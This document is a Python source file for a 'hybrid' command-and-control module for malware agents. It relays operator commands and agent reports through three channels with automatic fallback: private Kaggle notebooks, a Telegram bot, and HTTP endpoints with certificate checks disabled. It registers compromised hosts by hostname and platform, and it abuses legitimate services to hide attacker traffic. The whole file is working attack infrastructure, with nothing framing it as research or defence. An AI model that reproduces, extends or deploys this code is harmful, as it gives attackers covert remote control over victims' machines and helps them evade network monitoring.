#!/usr/bin/env python3
"""
Hybrid C2 Channel - Combines all C2 transport methods

Supports:
1. Kaggle Kernel-based C2 (commands in kernel source)
2. Telegram Bot API C2 (real-time messaging)
3. HTTP/S direct transport (Flask server)

Automatically selects best available channel.
"""

import json
import time
import base64
import os
from typing import Dict, Any, Optional, List
from abc import ABC, abstractmethod


class C2Channel(ABC):
    """Abstract base class for C2 channels"""
    
    @abstractmethod
    def send(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Send data to C2"""
        pass
    
    @abstractmethod
    def receive(self) -> List[Dict[str, Any]]:
        """Receive commands from C2"""
        pass
    
    @abstractmethod
    def is_available(self) -> bool:
        """Check if channel is available"""
        pass


class KaggleKernelChannel(C2Channel):
    """Kaggle Kernel-based C2 channel"""
    
    def __init__(self, username: str, api_key: str, kernel_slug: str = None):
        self.username = username
        self.api_key = api_key
        self.kernel_slug = kernel_slug or f"{username}/c2-channel"
        self.auth = base64.b64encode(f"{username}:{api_key}".encode()).decode()
        self._available = bool(username and api_key)
    
    def is_available(self) -> bool:
        return self._available
    
    def send(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Update kernel with new commands"""
        import requests
        
        # Create notebook with embedded commands
        notebook = self._create_notebook(data)
        notebook_json = json.dumps(notebook)
        
        resp = requests.post(
            "https://www.kaggle.com/api/v1/kernels/push",
            headers={
                "Authorization": f"Basic {self.auth}",
                "Content-Type": "application/json"
            },
            json={
                "slug": self.kernel_slug,
                "text": notebook_json,
                "language": "python",
                "kernelType": "notebook",
                "isPrivate": True,
                "enableInternet": True
            },
            timeout=60
        )
        
        if resp.status_code == 200:
            return {"success": True, "version": resp.json().get("versionNumber", 0)}
        return {"success": False, "error": f"HTTP {resp.status_code}"}
    
    def receive(self) -> List[Dict[str, Any]]:
        """Get commands from kernel source"""
        import requests
        import ast
        
        resp = requests.get(
            "https://www.kaggle.com/api/v1/kernels/pull",
            headers={"Authorization": f"Basic {self.auth}"},
            params={
                "userName": self.username,
                "kernelSlug": self.kernel_slug.split("/")[-1]
            },
            timeout=30
        )
        
        if resp.status_code == 200:
            data = resp.json()
            source_b64 = data.get("blob", {}).get("source", "")
            
            if source_b64:
                source = base64.b64decode(source_b64).decode()
                commands = self._parse_commands(source)
                if commands:
                    return [commands]
        
        return []
    
    def _create_notebook(self, commands: Dict[str, Any]) -> Dict:
        """Create notebook with embedded commands"""
        code_cells = [
            "# C2 CONFIG",
            f"COMMANDS = {json.dumps(commands, indent=4)}",
            "",
            "import os, json, time, urllib.request",
            "",
            "action = COMMANDS.get('action', 'idle')",
            "print(f'[C2] Action: {action}')",
        ]
        
        cells = []
        for code in code_cells:
            cells.append({
                "cell_type": "code",
                "source": [code] if "\n" not in code else code.split("\n"),
                "metadata": {},
                "execution_count": None,
                "outputs": []
            })
        
        return {
            "cells": cells,
            "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}},
            "nbformat": 4,
            "nbformat_minor": 4
        }
    
    def _parse_commands(self, source: str) -> Optional[Dict]:
        """Parse COMMANDS from notebook source"""
        import ast
        
        try:
            nb = json.loads(source)
            for cell in nb.get("cells", []):
                src = cell.get("source", [])
                if isinstance(src, list):
                    src = "".join(src)
                
                if "COMMANDS" in src and "=" in src:
                    start = src.find("{")
                    end = src.rfind("}") + 1
                    if start >= 0 and end > start:
                        dict_str = src[start:end]
                        try:
                            commands = ast.literal_eval(dict_str)
                            if isinstance(commands, dict):
                                return commands
                        except (ValueError, SyntaxError):
                            continue
        except:
            pass
        
        return None


class TelegramChannel(C2Channel):
    """Telegram Bot API C2 channel"""
    
    def __init__(self, bot_token: str, chat_id: str, agent_id: str):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.agent_id = agent_id
        self.api_url = f"https://api.telegram.org/bot{bot_token}"
        self.last_update_id = 0
        self._available = bool(bot_token and chat_id)
    
    def is_available(self) -> bool:
        return self._available
    
    def send(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Send message via Telegram"""
        import urllib.request
        import ssl
        
        text = data.get("message", json.dumps(data))
        
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        
        req = urllib.request.Request(
            f"{self.api_url}/sendMessage",
            data=json.dumps({"chat_id": self.chat_id, "text": text}).encode(),
            headers={"Content-Type": "application/json"}
        )
        
        try:
            resp = urllib.request.urlopen(req, timeout=30, context=ssl_ctx)
            result = json.loads(resp.read().decode())
            return {"success": result.get("ok", False)}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def receive(self) -> List[Dict[str, Any]]:
        """Get commands via Telegram getUpdates"""
        import urllib.request
        import ssl
        
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        
        req = urllib.request.Request(
            f"{self.api_url}/getUpdates",
            data=json.dumps({
                "offset": self.last_update_id + 1,
                "limit": 10,
                "timeout": 0
            }).encode(),
            headers={"Content-Type": "application/json"}
        )
        
        try:
            resp = urllib.request.urlopen(req, timeout=30, context=ssl_ctx)
            result = json.loads(resp.read().decode())
            
            commands = []
            for update in result.get("result", []):
                self.last_update_id = update.get("update_id", 0)
                
                message = update.get("message", {})
                text = message.get("text", "")
                
                # Parse command format: /cmd <agent_id> <command> [data]
                if text.startswith("/cmd"):
                    parts = text.split(maxsplit=3)
                    if len(parts) >= 3:
                        target_agent = parts[1]
                        if target_agent == self.agent_id or target_agent == "all":
                            cmd = parts[2] if len(parts) > 2 else ""
                            cmd_data = parts[3] if len(parts) > 3 else ""
                            commands.append({
                                "type": cmd,
                                "data": json.loads(cmd_data) if cmd_data.startswith("{") else {"args": cmd_data}
                            })
            
            return commands
        except Exception as e:
            return []
    
    def register(self, hostname: str, platform: str = "kaggle") -> bool:
        """Register agent via Telegram"""
        result = self.send({
            "message": f"""🔴 NEW AGENT REGISTERED
━━━━━━━━━━━━━━━━━━━━
🆔 ID: {self.agent_id}
🖥 Hostname: {hostname}
💻 Platform: {platform}
⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━"""
        })
        return result.get("success", False)


class HTTPChannel(C2Channel):
    """HTTP/S direct C2 channel"""
    
    def __init__(self, server_url: str, auth_token: str = None):
        self.server_url = server_url.rstrip("/")
        self.auth_token = auth_token
        self._available = bool(server_url)
    
    def is_available(self) -> bool:
        return self._available
    
    def send(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Send data via HTTP POST"""
        import urllib.request
        import ssl
        
        headers = {"Content-Type": "application/json"}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        
        req = urllib.request.Request(
            f"{self.server_url}/api/agent/report",
            data=json.dumps(data).encode(),
            headers=headers
        )
        
        try:
            resp = urllib.request.urlopen(req, timeout=30, context=ssl_ctx)
            return {"success": True, "response": resp.read().decode()}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def receive(self) -> List[Dict[str, Any]]:
        """Get commands via HTTP GET"""
        import urllib.request
        import ssl
        
        headers = {}
        if self.auth_token:
            headers["Authorization"] = f"Bearer {self.auth_token}"
        
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        
        req = urllib.request.Request(
            f"{self.server_url}/api/agent/tasks",
            headers=headers
        )
        
        try:
            resp = urllib.request.urlopen(req, timeout=30, context=ssl_ctx)
            result = json.loads(resp.read().decode())
            return result.get("tasks", [])
        except:
            return []


class HybridC2:
    """Hybrid C2 - uses multiple channels with automatic fallback"""
    
    def __init__(self, channels: List[C2Channel] = None):
        self.channels = channels or []
        self.primary_channel = None
        
        # Find first available channel
        for channel in self.channels:
            if channel.is_available():
                self.primary_channel = channel
                break
    
    def add_channel(self, channel: C2Channel):
        """Add a channel to the hybrid system"""
        self.channels.append(channel)
        if not self.primary_channel and channel.is_available():
            self.primary_channel = channel
    
    def send(self, data: Dict[str, Any], channel_type: str = None) -> Dict[str, Any]:
        """Send data via specified or primary channel"""
        channel = self._get_channel(channel_type) or self.primary_channel
        
        if channel:
            return channel.send(data)
        
        return {"success": False, "error": "No available channel"}
    
    def receive(self, channel_type: str = None) -> List[Dict[str, Any]]:
        """Receive commands from specified or all channels"""
        if channel_type:
            channel = self._get_channel(channel_type)
            if channel:
                return channel.receive()
            return []
        
        # Receive from all available channels
        all_commands = []
        for channel in self.channels:
            if channel.is_available():
                commands = channel.receive()
                all_commands.extend(commands)
        
        return all_commands
    
    def broadcast(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Send data via ALL available channels"""
        results = {}
        for channel in self.channels:
            if channel.is_available():
                results[channel.__class__.__name__] = channel.send(data)
        return results
    
    def _get_channel(self, channel_type: str) -> Optional[C2Channel]:
        """Get channel by type name"""
        if not channel_type:
            return None
        for channel in self.channels:
            if channel_type.lower() in channel.__class__.__name__.lower():
                return channel
        return None
    
    def get_status(self) -> Dict[str, Any]:
        """Get status of all channels"""
        status = {}
        for channel in self.channels:
            status[channel.__class__.__name__] = {
                "available": channel.is_available(),
                "primary": channel == self.primary_channel
            }
        return status


# Factory functions
def create_kaggle_c2(username: str, api_key: str, kernel_slug: str = None) -> KaggleKernelChannel:
    """Create Kaggle kernel-based C2 channel"""
    return KaggleKernelChannel(username, api_key, kernel_slug)


def create_telegram_c2(bot_token: str, chat_id: str, agent_id: str) -> TelegramChannel:
    """Create Telegram C2 channel"""
    return TelegramChannel(bot_token, chat_id, agent_id)


def create_http_c2(server_url: str, auth_token: str = None) -> HTTPChannel:
    """Create HTTP/S C2 channel"""
    return HTTPChannel(server_url, auth_token)


def create_hybrid_c2(config: Dict[str, Any]) -> HybridC2:
    """Create hybrid C2 from config dict"""
    channels = []
    
    # Kaggle channel
    if config.get("kaggle_username") and config.get("kaggle_api_key"):
        channels.append(KaggleKernelChannel(
            config["kaggle_username"],
            config["kaggle_api_key"],
            config.get("kaggle_kernel_slug")
        ))
    
    # Telegram channel
    if config.get("telegram_bot_token") and config.get("telegram_chat_id"):
        channels.append(TelegramChannel(
            config["telegram_bot_token"],
            config["telegram_chat_id"],
            config.get("agent_id", "unknown")
        ))
    
    # HTTP channel
    if config.get("c2_url"):
        channels.append(HTTPChannel(
            config["c2_url"],
            config.get("auth_token")
        ))
    
    return HybridC2(channels)
